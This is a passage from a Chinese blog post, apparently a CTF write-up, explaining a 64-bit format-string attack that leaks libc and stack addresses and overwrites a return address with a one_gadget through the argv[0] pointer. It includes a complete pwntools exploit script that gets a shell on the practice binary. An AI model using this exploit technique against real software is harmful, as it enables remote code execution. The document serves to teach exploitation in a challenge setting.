+<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>在这里 我利用我之前在32位时没改成功 将返回地址 为 one_gadget </p>
+<p>同理 这里也需要借用跳板来实现</p>
+<h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>先泄露libc pie 和 stack 分别用 ‘LIBC:%7$p’ + ‘PIE:%6$p’ + ‘Stack:%9$p’</p>
+<p> <img src="https://ae01.alicdn.com/kf/U4907c73fcd444a48b501a8a4a687b8802.jpg" alt="1"></p>
+<p>这里利用 <strong>指向argv[0]</strong> 作为跳板 利用 <strong>环境变量</strong>(argv[0]) 来修改返回地址</p>
+<p>argv[0]是指向第一个启动参数字符串的指针</p>
+<p>(0x7ffeca023638 - 0x7ffeca023568 )/8 + 9 = 35</p>
+<p> <img src="https://ae01.alicdn.com/kf/U9f8db536478a40a7bc22e86616899aff3.jpg" alt="2"></p>
+<p>先使 0x7ffeca023638 指向 0x7ffeca023558(返回地址) </p>
+<p> <img src="https://ae01.alicdn.com/kf/Ud685cfa706644cb2ba37f925fe2cfc285.jpg" alt="3"></p>
+<p>修改返回地址低2个字节</p>
+<p><img src="https://ae01.alicdn.com/kf/Uf979c5c402ae4231ae179ddf1547355cV.jpg" alt="4"></p>
+<p>然后改 0x7ffeca023638 指向 0x7ffeca023560(返回地址+2) </p>
+<p><img src="https://ae01.alicdn.com/kf/Uca62fd37d1c04ccaa7e9d637a4c542726.jpg" alt="5"></p>
+<p>修改 返回地址 第低3 4个字节</p>
+<p><img src="https://ae01.alicdn.com/kf/U4d3ed580fd434a36ac8ce441e6c18fe83.jpg" alt="6"></p>
+<p>然后退出，直接shell</p>
+<p>  <img src="https://ae01.alicdn.com/kf/Uc843353819cc441fbe3ab66794527d7aT.jpg" alt="7"></p>
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context(log_level="debug")</span></span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',27971)</span></span><br><span class="line">p = process(<span class="string">'./bsszfc'</span>)</span><br><span class="line">libc= ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'LIBC:%7$p'</span> + <span class="string">'PIE:%6$p'</span> + <span class="string">'Stack:%9$p'</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'LIBC:'</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">'__libc_start_main'</span>] <span class="number">-231</span></span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil('PIE:')</span></span><br><span class="line"><span class="comment">#pie = int(p.recv(14),16) - 0x830</span></span><br><span class="line"><span class="comment">#log.info('PIE:\t' + hex(pie))</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Stack:'</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">232</span></span><br><span class="line">log.info(<span class="string">'rbp Stack:\t'</span> + hex(stack))</span><br><span class="line"></span><br><span class="line">rce = libc_base + <span class="number">0x10A38C</span></span><br><span class="line">offset = stack&amp;<span class="number">0xFFFF</span></span><br><span class="line">off_1 = rce&amp;<span class="number">0xFFFF</span></span><br><span class="line">off_2=(rce&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xFFFF</span></span><br><span class="line">off_3=(rce&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'rce:\t'</span> + hex(rce))</span><br><span class="line">log.info(<span class="string">'offset:\t'</span> + hex(offset))</span><br><span class="line">log.info(<span class="string">'off_1:\t'</span> + hex(off_1))</span><br><span class="line">log.info(<span class="string">'off_2:\t'</span> + hex(off_2))</span><br><span class="line">log.info(<span class="string">'off_3:\t'</span> + hex(off_3))</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">'%'</span> + str(offset+<span class="number">8</span>) + <span class="string">'c'</span> +<span class="string">'%9$hnbbbb\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">payload  =<span class="string">'%'</span> + str(off_1) + <span class="string">'c'</span> +<span class="string">'%35$hnbbbb\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">payload  =<span class="string">'%'</span> + str(offset+<span class="number">10</span>) + <span class="string">'c'</span> +<span class="string">'%9$hnbbbb\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">payload  =<span class="string">'%'</span> + str(off_2) + <span class="string">'c'</span> +<span class="string">'%35$hnbbbb\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p.recvuntil('bbbb')</span></span><br><span class="line"><span class="string">payload  ='%' + str(offset+12) + 'c' +'%9$hnbbbb\x00'</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.recvuntil('bbbb')</span></span><br><span class="line"><span class="string">payload  ='%' + str(off_3) + 'c' +'%35$hnbbbb\x00'</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">p.sendline(<span class="string">'66666666\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+      <!-- reward -->
+      
+      <div id="reward-btn">
+        Reward
+      </div>
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>Copyright： </strong>
+              Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/07/01/geshihua/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/07/01/dasctf5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            2020 DASCTF五月赛
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/06/30/dasctf6/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">2020 DASCTF六月赛</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: 'false',
+        verify: 'false',
+        avatar: 'mp',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2015-2021
+        John Doe
+      </li>
+      <li>
+        
+        Powered by
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <span>
+  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
+  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
+</span>
+        
+      </li>
+      
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+      strings: ['你努力，剩下的交给我', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
+      startDelay: 0,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 100,
+      showCursor: true
+    });
+  } catch (err) {
+  }
+
+</script>
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+
+
+    
+  </div>
+</body>
+
+</html>
